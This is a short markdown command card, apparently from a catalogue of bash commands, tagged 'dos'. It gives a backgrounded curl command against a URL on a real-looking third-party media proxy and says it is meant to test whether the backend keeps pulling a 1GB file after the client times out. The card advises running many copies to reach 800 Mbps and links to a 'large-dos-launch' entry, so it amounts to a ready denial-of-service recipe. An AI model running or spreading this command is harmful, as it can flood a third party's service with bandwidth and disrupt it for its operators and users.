---
id: cmd-curl-postfix-large-001
data: >-
  curl
  https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/████████
  > /dev/null &
tags:
  - post-fix
  - dos
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.920Z'
verified: false
validated: true
submitted: true
---
# curl-postfix-large

## Command

```bash
curl https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/████████ > /dev/null &
```

## Description

Background curl to big.php via proxy after partial fix; tests if backend continues 1GB download despite client timeout at 8s.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `> /dev/null` | Discard | Yes |
| `&` | Background | Yes |

## Examples

### Basic Usage

Run multiple for 800 Mbps.

## Expected Output

Client timeout, but full backend 1GB pull.

## Related

- [[commands/curl-large-dos-launch]]
